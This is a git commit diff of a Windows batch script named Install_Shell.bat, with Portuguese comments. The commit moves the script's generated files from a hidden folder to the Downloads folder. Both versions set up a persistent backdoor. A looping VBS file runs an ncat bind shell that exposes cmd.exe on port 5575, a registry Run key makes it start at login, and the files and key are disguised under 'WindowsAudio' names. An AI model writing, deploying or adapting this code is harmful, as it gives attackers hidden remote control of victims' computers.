46cb36759143d82590a285afa50bee59da567136
Root Maciel <65637444+rootmaciel@users.noreply.github.com>
2026-06-09 21:40:39 -0300

    Relocate audio scripts to Downloads directory
    Moved audio.vbs and audio.bat creation to Downloads folder and updated registry entry.

--- Install_Shell.bat
+++ Install_Shell.bat
@@ -4,24 +4,20 @@ if not "%1"=="hidden" (
     exit
 )
 
-:: Criar pasta oculta
-mkdir "%USERPROFILE%\WindowsAudio" > nul 2>&1
-attrib +h "%USERPROFILE%\WindowsAudio" > nul 2>&1
-
 :: Criar audio.vbs
-echo Do > "%USERPROFILE%\WindowsAudio\audio.vbs"
-echo CreateObject("Wscript.Shell").Run "ncat -lnp 5575 -e cmd.exe", 0, True >> "%USERPROFILE%\WindowsAudio\audio.vbs"
-echo Loop >> "%USERPROFILE%\WindowsAudio\audio.vbs"
+echo Do > "%USERPROFILE%\Downloads\audio.vbs"
+echo CreateObject("Wscript.Shell").Run "ncat -lnp 5575 -e cmd.exe", 0, True >> "%USERPROFILE%\Downloads\audio.vbs"
+echo Loop >> "%USERPROFILE%\Downloads\audio.vbs"
 
 :: Criar audio.bat
-echo @echo off > "%USERPROFILE%\WindowsAudio\audio.bat"
-echo start "" /B wscript.exe //nologo "%USERPROFILE%\WindowsAudio\audio.vbs" >> "%USERPROFILE%\WindowsAudio\audio.bat"
-echo exit >> "%USERPROFILE%\WindowsAudio\audio.bat"
+echo @echo off > "%USERPROFILE%\Downloads\audio.bat"
+echo start "" /B wscript.exe //nologo "%USERPROFILE%\Downloads\audio.vbs" >> "%USERPROFILE%\Downloads\audio.bat"
+echo exit >> "%USERPROFILE%\Downloads\audio.bat"
 
 :: Registrar no Windows
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /t REG_SZ /d "%USERPROFILE%\WindowsAudio\audio.bat" /f > nul 2>&1
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /t REG_SZ /d "%USERPROFILE%\Downloads\audio.bat" /f > nul 2>&1
 
 :: Iniciar listener
-start "" /B wscript.exe //nologo "%USERPROFILE%\WindowsAudio\audio.vbs"
+start "" /B wscript.exe //nologo "%USERPROFILE%\Downloads\audio.vbs"
 
 exit
